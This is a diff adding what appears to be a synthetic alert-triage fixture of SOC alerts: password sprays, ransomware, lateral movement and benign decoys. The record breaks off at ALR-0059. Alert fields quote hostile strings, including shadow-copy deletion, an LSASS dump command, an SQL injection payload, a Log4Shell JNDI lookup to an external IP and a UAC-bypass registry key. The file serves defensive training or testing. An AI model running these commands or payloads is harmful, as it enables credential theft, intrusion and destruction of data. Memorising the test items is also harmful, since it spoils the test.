@@ -1,0 +1,3257 @@
+[
+  {
+    "id": "ALR-0001",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 91.240.118.168",
+    "description": "Single IP 91.240.118.168 attempted logins against 8 different accounts (1-2 attempts each) in 10 minutes using common passwords.",
+    "timestamp": "2026-10-20T11:30:07Z",
+    "src_ip": "91.240.118.168",
+    "raw": {
+      "targeted_accounts": [
+        "mgarcia",
+        "cwhite",
+        "apatel",
+        "ehernandez",
+        "rbrown",
+        "lchen",
+        "kwilliams",
+        "dnguyen"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": []
+    }
+  },
+  {
+    "id": "ALR-0002",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against da_jsmith",
+    "description": "287 failed logins for da_jsmith from 45.155.205.109 in 4 minutes. A successful login for da_jsmith from the same IP followed 30 seconds later.",
+    "timestamp": "2026-10-04T23:21:47Z",
+    "user": "da_jsmith",
+    "src_ip": "45.155.205.109",
+    "dst_host": "SRV-FILE01",
+    "raw": {
+      "failed_count": 287,
+      "window_minutes": 4,
+      "subsequent_success": true,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0003",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for omoore",
+    "description": "User omoore signed in from 203.0.113.10 (US) and then from 73.147.219.153 (US) 31 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-05T22:34:58Z",
+    "user": "omoore",
+    "src_ip": "73.147.219.153",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "73.147.219.153",
+      "minutes_between": 31,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0004",
+    "source": "edr",
+    "rule_name": "UAC Bypass",
+    "title": "UAC bypass on WS-FIN-004",
+    "description": "Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on WS-FIN-004.",
+    "timestamp": "2026-10-17T09:41:55Z",
+    "host": "WS-FIN-004",
+    "user": "pjackson",
+    "process": {
+      "name": "fodhelper.exe",
+      "child": "C:\\Users\\Public\\p.exe",
+      "integrity": "high"
+    }
+  },
+  {
+    "id": "ALR-0005",
+    "source": "firewall",
+    "rule_name": "Port Scan Detected",
+    "title": "Inbound port scan from 91.240.118.166",
+    "description": "External IP 91.240.118.166 probed 884 ports on the perimeter firewall in 5 minutes. All connections were dropped.",
+    "timestamp": "2026-10-12T07:34:34Z",
+    "src_ip": "91.240.118.166",
+    "raw": {
+      "ports_probed": 884,
+      "action": "dropped",
+      "direction": "inbound"
+    }
+  },
+  {
+    "id": "ALR-0006",
+    "source": "edr",
+    "rule_name": "Ransomware Behavior",
+    "title": "Mass file encryption on WS-OPS-004",
+    "description": "4454 files renamed to *.enc on WS-OPS-004 in 2 minutes. 'vssadmin delete shadows /all /quiet' ran just before. Ransom note README_RESTORE.txt dropped in each folder.",
+    "timestamp": "2026-10-20T06:51:15Z",
+    "host": "WS-OPS-004",
+    "user": "cwhite",
+    "raw": {
+      "files_modified": 4454,
+      "new_extension": ".enc",
+      "shadow_copies_deleted": true
+    }
+  },
+  {
+    "id": "ALR-0007",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Scheduled task on WS-OPS-007",
+    "description": "Scheduled task GoogleUpdateTaskMachineUA created on WS-OPS-007 by the signed Google Update installer.",
+    "timestamp": "2026-10-08T17:33:31Z",
+    "host": "WS-OPS-007",
+    "user": "SYSTEM",
+    "process": {
+      "command_line": "schtasks /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /sc hourly"
+    }
+  },
+  {
+    "id": "ALR-0008",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Blocked exploit attempt against SRV-WEB01",
+    "description": "WAF blocked a request from 185.220.101.13 to SRV-WEB01 with payload \"' OR 1=1 UNION SELECT username,password FROM users--\". HTTP 403 returned.",
+    "timestamp": "2026-10-16T08:12:44Z",
+    "host": "SRV-WEB01",
+    "src_ip": "185.220.101.13",
+    "raw": {
+      "payload": "' OR 1=1 UNION SELECT username,password FROM users--",
+      "response_code": 403,
+      "blocked": true
+    }
+  },
+  {
+    "id": "ALR-0009",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against omoore",
+    "description": "226 failed logins for omoore from 73.160.141.107 in 3 minutes.",
+    "timestamp": "2026-10-16T06:21:13Z",
+    "user": "omoore",
+    "src_ip": "73.160.141.107",
+    "dst_host": "SRV-SQL01",
+    "raw": {
+      "failed_count": 226,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0010",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-OPS-020",
+    "description": "slack_setup.exe executed on WS-OPS-020 by ehernandez; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-21T19:51:41Z",
+    "host": "WS-OPS-020",
+    "user": "ehernandez",
+    "file_hash": "00a064a4d1cc6c3b6ba1cc08cc2e56d93f07fcd7d7559d1f4faac112182f1d75",
+    "file": {
+      "name": "slack_setup.exe",
+      "path": "C:\\Users\\ehernandez\\Downloads\\slack_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0011",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Scheduled task on WS-SALES-013",
+    "description": "Scheduled task GoogleUpdateTaskMachineUA created on WS-SALES-013 by the signed Google Update installer.",
+    "timestamp": "2026-10-04T20:50:45Z",
+    "host": "WS-SALES-013",
+    "user": "SYSTEM",
+    "process": {
+      "command_line": "schtasks /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /sc hourly"
+    }
+  },
+  {
+    "id": "ALR-0012",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from SRV-NESSUS01",
+    "description": "SRV-NESSUS01 (10.20.31.229) scanned 254 hosts on 10.20.0.0/16 across 1000 ports. Host is the vulnerability scanner; scan falls in the weekly Tuesday scan window.",
+    "timestamp": "2026-10-06T13:50:40Z",
+    "host": "SRV-NESSUS01",
+    "src_ip": "10.20.31.229",
+    "raw": {
+      "hosts_scanned": 254,
+      "ports": 1000,
+      "scheduled": true
+    }
+  },
+  {
+    "id": "ALR-0013",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against da_jsmith",
+    "description": "83 failed logins for da_jsmith from 194.26.192.72 in 4 minutes.",
+    "timestamp": "2026-10-05T00:09:37Z",
+    "user": "da_jsmith",
+    "src_ip": "194.26.192.72",
+    "dst_host": "SRV-SQL01",
+    "raw": {
+      "failed_count": 83,
+      "window_minutes": 4,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0014",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-FIN-019",
+    "description": "slack_setup.exe executed on WS-FIN-019 by ehernandez; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-22T19:09:35Z",
+    "host": "WS-FIN-019",
+    "user": "ehernandez",
+    "file_hash": "ae142af19a15ae941d9bfa35ef41f61d7d66c806a13c88b2e8fea5c3847d558d",
+    "file": {
+      "name": "slack_setup.exe",
+      "path": "C:\\Users\\ehernandez\\Downloads\\slack_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0015",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-FIN-003",
+    "description": "AV detected scan_doc.exe on WS-FIN-003 and quarantined it before execution.",
+    "timestamp": "2026-10-07T00:16:13Z",
+    "host": "WS-FIN-003",
+    "user": "jsmith",
+    "file_hash": "656d3ebb3ef84fa183a54ac40036d34d0025c6dd15d99df29ae0700e153f50a5",
+    "file": {
+      "name": "scan_doc.exe",
+      "path": "C:\\Users\\jsmith\\Downloads\\scan_doc.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0016",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against it-admin",
+    "description": "318 failed logins for it-admin from 45.155.205.123 in 3 minutes.",
+    "timestamp": "2026-10-12T14:42:37Z",
+    "user": "it-admin",
+    "src_ip": "45.155.205.123",
+    "dst_host": "SRV-JUMP01",
+    "raw": {
+      "failed_count": 318,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0017",
+    "source": "edr",
+    "rule_name": "LSASS Memory Access",
+    "title": "LSASS dump on WS-HR-006",
+    "description": "Process dumped lsass.exe memory on WS-HR-006 under it-admin. Command: procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
+    "timestamp": "2026-10-18T04:33:32Z",
+    "host": "WS-HR-006",
+    "user": "it-admin",
+    "process": {
+      "command_line": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
+      "target": "lsass.exe",
+      "access": "0x1FFFFF"
+    }
+  },
+  {
+    "id": "ALR-0018",
+    "source": "edr",
+    "rule_name": "Ransomware Behavior",
+    "title": "Mass file encryption on WS-FIN-003",
+    "description": "3800 files renamed to *.crypt on WS-FIN-003 in 2 minutes. 'vssadmin delete shadows /all /quiet' ran just before. Ransom note README_RESTORE.txt dropped in each folder.",
+    "timestamp": "2026-10-20T00:49:51Z",
+    "host": "WS-FIN-003",
+    "user": "lchen",
+    "raw": {
+      "files_modified": 3800,
+      "new_extension": ".crypt",
+      "shadow_copies_deleted": true
+    }
+  },
+  {
+    "id": "ALR-0019",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 91.240.118.160",
+    "description": "Single IP 91.240.118.160 attempted logins against 8 different accounts (1-2 attempts each) in 10 minutes using common passwords. One attempt succeeded for dnguyen.",
+    "timestamp": "2026-10-08T06:17:02Z",
+    "src_ip": "91.240.118.160",
+    "user": "dnguyen",
+    "raw": {
+      "targeted_accounts": [
+        "dnguyen",
+        "bthompson",
+        "tmartin",
+        "pjackson",
+        "omoore",
+        "sjohnson",
+        "mgarcia",
+        "jsmith"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": [
+        "dnguyen"
+      ]
+    }
+  },
+  {
+    "id": "ALR-0020",
+    "source": "edr",
+    "rule_name": "AV Signature Update Failed",
+    "title": "Signature update failed on WS-HR-017",
+    "description": "Defender signature update failed on WS-HR-017 (error 0x80240022). Last successful update 26 hours ago.",
+    "timestamp": "2026-10-18T14:48:57Z"
+  },
+  {
+    "id": "ALR-0021",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-SQL01",
+    "description": "Account support created and added to local Administrators on SRV-SQL01 at 03:14 by ehernandez, a non-IT user. No matching change ticket.",
+    "timestamp": "2026-10-17T04:32:12Z",
+    "host": "SRV-SQL01",
+    "user": "ehernandez",
+    "raw": {
+      "new_account": "support",
+      "change_ticket": false
+    }
+  },
+  {
+    "id": "ALR-0022",
+    "source": "okta",
+    "rule_name": "Password Spray Detected",
+    "title": "Password spray from 45.155.205.127",
+    "description": "Single IP 45.155.205.127 attempted logins against 15 different accounts (1-2 attempts each) in 10 minutes using common passwords.",
+    "timestamp": "2026-10-22T07:27:04Z",
+    "src_ip": "45.155.205.127",
+    "raw": {
+      "targeted_accounts": [
+        "tmartin",
+        "apatel",
+        "omoore",
+        "nlee",
+        "kwilliams",
+        "pjackson",
+        "cwhite",
+        "sjohnson",
+        "mgarcia",
+        "ehernandez",
+        "jsmith",
+        "dnguyen",
+        "rbrown",
+        "lchen",
+        "bthompson"
+      ],
+      "attempts_per_account": "1-2",
+      "successes": []
+    }
+  },
+  {
+    "id": "ALR-0023",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by kwilliams",
+    "description": "kwilliams uploaded 36.5 GB to mega.nz (personal cloud storage, not sanctioned) from WS-OPS-005 at 02:40, well outside the user's normal hours. Files came from \\\\SRV-FILE01\\Finance.",
+    "timestamp": "2026-10-05T23:41:42Z",
+    "user": "kwilliams",
+    "host": "WS-OPS-005",
+    "raw": {
+      "destination": "mega.nz",
+      "bytes_out_gb": 36.5,
+      "category": "personal",
+      "source_share": "Finance"
+    }
+  },
+  {
+    "id": "ALR-0024",
+    "source": "okta",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against svc_backup",
+    "description": "152 failed logins for svc_backup from 194.26.192.75 in 4 minutes.",
+    "timestamp": "2026-10-16T05:42:53Z",
+    "user": "svc_backup",
+    "src_ip": "194.26.192.75",
+    "raw": {
+      "failed_count": 152,
+      "window_minutes": 4,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0025",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for omoore",
+    "description": "User omoore signed in from 203.0.113.11 (US) and then from 104.28.14.8 (US) 29 minutes later. Distance implies travel faster than possible.",
+    "timestamp": "2026-10-14T06:22:20Z",
+    "user": "omoore",
+    "src_ip": "104.28.14.8",
+    "raw": {
+      "first_ip": "203.0.113.11",
+      "second_ip": "104.28.14.8",
+      "minutes_between": 29,
+      "new_device": false
+    }
+  },
+  {
+    "id": "ALR-0026",
+    "source": "edr",
+    "rule_name": "Malicious File Executed",
+    "title": "Malicious process on WS-ENG-023",
+    "description": "update.exe executed on WS-ENG-023 by jsmith. AV remediation failed; the process made outbound network connections.",
+    "timestamp": "2026-10-17T19:18:32Z",
+    "host": "WS-ENG-023",
+    "user": "jsmith",
+    "file_hash": "63c40c5cc884812b5fdb1ee20eadee31b3c5f1190c66dc5e9380b9960bb6d5e2",
+    "file": {
+      "name": "update.exe",
+      "path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.exe"
+    },
+    "raw": {
+      "action": "remediation_failed",
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0027",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for mgarcia",
+    "description": "User mgarcia signed in from 203.0.113.10 (US) and then from 185.220.101.23 (DE) 25 minutes later. Distance implies travel faster than possible. The second sign-in used a new, unregistered device and MFA was satisfied by a push approval.",
+    "timestamp": "2026-10-02T05:17:48Z",
+    "user": "mgarcia",
+    "src_ip": "185.220.101.23",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "185.220.101.23",
+      "minutes_between": 25,
+      "new_device": true
+    }
+  },
+  {
+    "id": "ALR-0028",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-SQL01",
+    "description": "Account support created and added to local Administrators on SRV-SQL01 by it-admin during business hours. Matches change ticket CHG-63208.",
+    "timestamp": "2026-10-05T22:58:32Z",
+    "host": "SRV-SQL01",
+    "user": "it-admin",
+    "raw": {
+      "new_account": "support",
+      "change_ticket": true
+    }
+  },
+  {
+    "id": "ALR-0029",
+    "source": "windows_security",
+    "rule_name": "Audit Policy Change",
+    "title": "Audit policy updated on SRV-DC01",
+    "description": "Audit policy changed on SRV-DC01 by it-admin via Group Policy update during the approved maintenance window.",
+    "timestamp": "2026-10-11T15:17:03Z"
+  },
+  {
+    "id": "ALR-0030",
+    "source": "waf",
+    "rule_name": "Web Exploit Attempt",
+    "title": "Blocked exploit attempt against SRV-WEB01",
+    "description": "WAF blocked a request from 185.220.101.33 to SRV-WEB01 with payload '${jndi:ldap://185.220.101.33:1389/a}'. HTTP 403 returned.",
+    "timestamp": "2026-10-09T00:40:05Z",
+    "host": "SRV-WEB01",
+    "src_ip": "185.220.101.33",
+    "raw": {
+      "payload": "${jndi:ldap://185.220.101.33:1389/a}",
+      "response_code": 403,
+      "blocked": true
+    }
+  },
+  {
+    "id": "ALR-0031",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-DC01",
+    "description": "Account sysadm created and added to local Administrators on SRV-DC01 at 03:14 by cwhite, a non-IT user. No matching change ticket.",
+    "timestamp": "2026-10-08T00:16:55Z",
+    "host": "SRV-DC01",
+    "user": "cwhite",
+    "raw": {
+      "new_account": "sysadm",
+      "change_ticket": false
+    }
+  },
+  {
+    "id": "ALR-0032",
+    "source": "edr",
+    "rule_name": "AV Signature Update Failed",
+    "title": "Signature update failed on WS-HR-011",
+    "description": "Defender signature update failed on WS-HR-011 (error 0x80240022). Last successful update 26 hours ago.",
+    "timestamp": "2026-10-11T22:26:59Z"
+  },
+  {
+    "id": "ALR-0033",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by ehernandez",
+    "description": "ehernandez uploaded 1.8 GB to acme.sharepoint.com (company-sanctioned SharePoint) from WS-FIN-017 during work hours.",
+    "timestamp": "2026-10-08T15:10:16Z",
+    "user": "ehernandez",
+    "host": "WS-FIN-017",
+    "raw": {
+      "destination": "acme.sharepoint.com",
+      "bytes_out_gb": 1.8,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0034",
+    "source": "edr",
+    "rule_name": "AV Signature Update Failed",
+    "title": "Signature update failed on WS-FIN-024",
+    "description": "Defender signature update failed on WS-FIN-024 (error 0x80240022). Last successful update 26 hours ago.",
+    "timestamp": "2026-10-10T18:33:48Z"
+  },
+  {
+    "id": "ALR-0035",
+    "source": "okta",
+    "rule_name": "Account Locked Out",
+    "title": "sjohnson locked out",
+    "description": "sjohnson locked out after 5 failed attempts from their usual device at the office, then self-service unlocked via verified MFA.",
+    "timestamp": "2026-10-17T16:17:22Z",
+    "user": "sjohnson"
+  },
+  {
+    "id": "ALR-0036",
+    "source": "proxy",
+    "rule_name": "Large Upload to Cloud Storage",
+    "title": "Large upload by kwilliams",
+    "description": "kwilliams uploaded 0.5 GB to acme.sharepoint.com (company-sanctioned SharePoint) from WS-FIN-005 during work hours.",
+    "timestamp": "2026-10-17T22:12:32Z",
+    "user": "kwilliams",
+    "host": "WS-FIN-005",
+    "raw": {
+      "destination": "acme.sharepoint.com",
+      "bytes_out_gb": 0.5,
+      "category": "sanctioned"
+    }
+  },
+  {
+    "id": "ALR-0037",
+    "source": "edr",
+    "rule_name": "Sensor Offline",
+    "title": "EDR sensor offline on WS-ENG-008",
+    "description": "EDR sensor on WS-ENG-008 has not checked in for 3 days. Asset inventory shows the laptop as in repair.",
+    "timestamp": "2026-10-15T15:42:52Z"
+  },
+  {
+    "id": "ALR-0038",
+    "source": "edr",
+    "rule_name": "Sensor Offline",
+    "title": "EDR sensor offline on WS-SALES-013",
+    "description": "EDR sensor on WS-SALES-013 has not checked in for 3 days. Asset inventory shows the laptop as in repair.",
+    "timestamp": "2026-10-18T20:32:19Z"
+  },
+  {
+    "id": "ALR-0039",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-ENG-006",
+    "description": "chrome_setup.exe executed on WS-ENG-006 by dnguyen; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-21T16:25:22Z",
+    "host": "WS-ENG-006",
+    "user": "dnguyen",
+    "file_hash": "ba13366e43d30815ac52c5ada6aa822dd8ead5c06a29f207fbd88d7ce840e9e4",
+    "file": {
+      "name": "chrome_setup.exe",
+      "path": "C:\\Users\\dnguyen\\Downloads\\chrome_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0040",
+    "source": "edr",
+    "rule_name": "PowerShell Execution Policy Bypass",
+    "title": "PowerShell bypass on WS-OPS-012",
+    "description": "PowerShell started with -ExecutionPolicy Bypass on WS-OPS-012 by SYSTEM. Parent: ccmexec.exe (Microsoft SCCM client). Script path is in the SCCM cache.",
+    "timestamp": "2026-10-01T15:40:47Z",
+    "host": "WS-OPS-012",
+    "user": "SYSTEM",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1",
+      "parent": "ccmexec.exe",
+      "signed_parent": true
+    }
+  },
+  {
+    "id": "ALR-0041",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for rbrown",
+    "description": "User rbrown signed in from 203.0.113.10 (US) and then from 185.220.101.17 (DE) 32 minutes later. Distance implies travel faster than possible. The second sign-in used a new, unregistered device and MFA was satisfied by a push approval.",
+    "timestamp": "2026-10-17T21:18:38Z",
+    "user": "rbrown",
+    "src_ip": "185.220.101.17",
+    "raw": {
+      "first_ip": "203.0.113.10",
+      "second_ip": "185.220.101.17",
+      "minutes_between": 32,
+      "new_device": true
+    }
+  },
+  {
+    "id": "ALR-0042",
+    "source": "okta",
+    "rule_name": "Account Locked Out",
+    "title": "kwilliams locked out",
+    "description": "kwilliams locked out after 5 failed attempts from their usual device at the office, then self-service unlocked via verified MFA.",
+    "timestamp": "2026-10-02T21:11:10Z",
+    "user": "kwilliams"
+  },
+  {
+    "id": "ALR-0043",
+    "source": "windows_security",
+    "rule_name": "Brute Force Login Attempt",
+    "title": "Brute force against admin",
+    "description": "208 failed logins for admin from 91.240.118.170 in 3 minutes.",
+    "timestamp": "2026-10-02T09:13:22Z",
+    "user": "admin",
+    "src_ip": "91.240.118.170",
+    "dst_host": "SRV-DC02",
+    "raw": {
+      "failed_count": 208,
+      "window_minutes": 3,
+      "subsequent_success": false,
+      "auth_type": "password"
+    }
+  },
+  {
+    "id": "ALR-0044",
+    "source": "proxy",
+    "rule_name": "Periodic Beaconing",
+    "title": "Beaconing from WS-HR-001",
+    "description": "WS-HR-001 sent HTTP POSTs to 185.220.101.20 every 300 seconds (+/- 2s jitter) for 6 hours. Small, uniform request sizes. User agent mimics an outdated browser.",
+    "timestamp": "2026-10-21T06:15:32Z",
+    "host": "WS-HR-001",
+    "dst_ip": "185.220.101.20",
+    "raw": {
+      "interval_seconds": 300,
+      "duration_hours": 6,
+      "requests": 72
+    }
+  },
+  {
+    "id": "ALR-0045",
+    "source": "azure_ad",
+    "rule_name": "Impossible Travel",
+    "title": "Impossible travel for mgarcia",
+    "description": "User mgarcia signed in from 203.0.113.11 (US) and then from 185.220.101.21 (DE) 10 minutes later. Distance implies travel faster than possible. The second sign-in used a new, unregistered device and MFA was satisfied by a push approval.",
+    "timestamp": "2026-10-13T00:19:19Z",
+    "user": "mgarcia",
+    "src_ip": "185.220.101.21",
+    "raw": {
+      "first_ip": "203.0.113.11",
+      "second_ip": "185.220.101.21",
+      "minutes_between": 10,
+      "new_device": true
+    }
+  },
+  {
+    "id": "ALR-0046",
+    "source": "edr",
+    "rule_name": "Unsigned/Rare Binary Executed",
+    "title": "Rare binary on WS-FIN-011",
+    "description": "7-zip_setup.exe executed on WS-FIN-011 by ehernandez; binary seen on fewer than 3 hosts in the fleet.",
+    "timestamp": "2026-10-22T23:24:48Z",
+    "host": "WS-FIN-011",
+    "user": "ehernandez",
+    "file_hash": "07a79e2275e3cada2be752c648cf0672a9fc5dde8d5650aaf635ae1b8aff4171",
+    "file": {
+      "name": "7-zip_setup.exe",
+      "path": "C:\\Users\\ehernandez\\Downloads\\7-zip_setup.exe"
+    },
+    "raw": {
+      "prevalence": 2,
+      "executed": true
+    }
+  },
+  {
+    "id": "ALR-0047",
+    "source": "firewall",
+    "rule_name": "Port Scan Detected",
+    "title": "Inbound port scan from 185.220.101.29",
+    "description": "External IP 185.220.101.29 probed 2734 ports on the perimeter firewall in 5 minutes. All connections were dropped.",
+    "timestamp": "2026-10-21T04:02:52Z",
+    "src_ip": "185.220.101.29",
+    "raw": {
+      "ports_probed": 2734,
+      "action": "dropped",
+      "direction": "inbound"
+    }
+  },
+  {
+    "id": "ALR-0048",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-WEB01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-WEB01 as administrator from external IP 73.118.80.252. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-05T16:48:32Z",
+    "host": "SRV-WEB01",
+    "user": "administrator",
+    "src_ip": "73.118.80.252",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0049",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-JUMP01",
+    "description": "Account svc_monitor created and added to local Administrators on SRV-JUMP01 at 03:14 by cwhite, a non-IT user. No matching change ticket.",
+    "timestamp": "2026-10-22T04:51:57Z",
+    "host": "SRV-JUMP01",
+    "user": "cwhite",
+    "raw": {
+      "new_account": "svc_monitor",
+      "change_ticket": false
+    }
+  },
+  {
+    "id": "ALR-0050",
+    "source": "windows_security",
+    "rule_name": "Local Admin Account Created",
+    "title": "New admin account on SRV-EXCH01",
+    "description": "Account helpdesk2 created and added to local Administrators on SRV-EXCH01 at 03:14 by mgarcia, a non-IT user. No matching change ticket.",
+    "timestamp": "2026-10-01T00:08:40Z",
+    "host": "SRV-EXCH01",
+    "user": "mgarcia",
+    "raw": {
+      "new_account": "helpdesk2",
+      "change_ticket": false
+    }
+  },
+  {
+    "id": "ALR-0051",
+    "source": "edr",
+    "rule_name": "Scheduled Task Created",
+    "title": "Scheduled task on WS-FIN-014",
+    "description": "Scheduled task GoogleUpdateTaskMachineUA created on WS-FIN-014 by the signed Google Update installer.",
+    "timestamp": "2026-10-13T21:35:03Z",
+    "host": "WS-FIN-014",
+    "user": "SYSTEM",
+    "process": {
+      "command_line": "schtasks /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /sc hourly"
+    }
+  },
+  {
+    "id": "ALR-0052",
+    "source": "edr",
+    "rule_name": "UAC Bypass",
+    "title": "UAC bypass on WS-SALES-009",
+    "description": "Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on WS-SALES-009.",
+    "timestamp": "2026-10-21T17:43:15Z",
+    "host": "WS-SALES-009",
+    "user": "jsmith",
+    "process": {
+      "name": "fodhelper.exe",
+      "child": "C:\\Users\\Public\\p.exe",
+      "integrity": "high"
+    }
+  },
+  {
+    "id": "ALR-0053",
+    "source": "edr",
+    "rule_name": "Ransomware Behavior",
+    "title": "Mass file encryption on WS-HR-015",
+    "description": "854 files renamed to *.enc on WS-HR-015 in 2 minutes. 'vssadmin delete shadows /all /quiet' ran just before. Ransom note README_RESTORE.txt dropped in each folder.",
+    "timestamp": "2026-10-15T02:47:59Z",
+    "host": "WS-HR-015",
+    "user": "tmartin",
+    "raw": {
+      "files_modified": 854,
+      "new_extension": ".enc",
+      "shadow_copies_deleted": true
+    }
+  },
+  {
+    "id": "ALR-0054",
+    "source": "windows_security",
+    "rule_name": "Audit Policy Change",
+    "title": "Audit policy updated on SRV-DC01",
+    "description": "Audit policy changed on SRV-DC01 by it-admin via Group Policy update during the approved maintenance window.",
+    "timestamp": "2026-10-17T15:47:47Z"
+  },
+  {
+    "id": "ALR-0055",
+    "source": "windows_security",
+    "rule_name": "External RDP Login",
+    "title": "RDP login to SRV-JUMP01 from internet",
+    "description": "Successful RDP (logon type 10) to SRV-JUMP01 as it-admin from external IP 185.220.101.19. RDP is not supposed to be exposed to the internet.",
+    "timestamp": "2026-10-08T23:41:29Z",
+    "host": "SRV-JUMP01",
+    "user": "it-admin",
+    "src_ip": "185.220.101.19",
+    "raw": {
+      "logon_type": 10,
+      "success": true
+    }
+  },
+  {
+    "id": "ALR-0056",
+    "source": "ids",
+    "rule_name": "Internal Port Scan",
+    "title": "Internal port scan from WS-HR-001",
+    "description": "Workstation WS-HR-001 (10.20.5.124) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in 3 minutes. This host has no history of scanning.",
+    "timestamp": "2026-10-22T09:49:02Z",
+    "host": "WS-HR-001",
+    "src_ip": "10.20.5.124",
+    "raw": {
+      "hosts_scanned": 180,
+      "ports": [
+        445,
+        3389,
+        5985,
+        22
+      ],
+      "scheduled": false
+    }
+  },
+  {
+    "id": "ALR-0057",
+    "source": "windows_security",
+    "rule_name": "Audit Policy Change",
+    "title": "Audit policy updated on SRV-DC01",
+    "description": "Audit policy changed on SRV-DC01 by it-admin via Group Policy update during the approved maintenance window.",
+    "timestamp": "2026-10-07T15:38:09Z"
+  },
+  {
+    "id": "ALR-0058",
+    "source": "edr",
+    "rule_name": "Malware Detected",
+    "title": "Malware detected on WS-SALES-012",
+    "description": "AV detected setup_x64.exe on WS-SALES-012 and quarantined it before execution.",
+    "timestamp": "2026-10-02T15:17:43Z",
+    "host": "WS-SALES-012",
+    "user": "omoore",
+    "file_hash": "4a20cf28f01af0108e392c9a91d7e4d2281b626f8c46c76b2d84ea70b8af8e50",
+    "file": {
+      "name": "setup_x64.exe",
+      "path": "C:\\Users\\omoore\\Downloads\\setup_x64.exe"
+    },
+    "raw": {
+      "action": "quarantined",
+      "executed": false
+    }
+  },
+  {
+    "id": "ALR-0059",
+    "source": "edr",
+    "rule_name": "Suspicious Encoded PowerShell",
+    "title": "Encoded PowerShell on WS-ENG-004",
+    "description": "Encoded PowerShell command on WS-ENG-004 by bthompson, parent process winword.exe. Decoded command downloads and executes a script from 91.240.118.162.",
+    "timestamp": "2026-10-17T09:29:29Z",
+    "host": "WS-ENG-004",
+    "user": "bthompson",
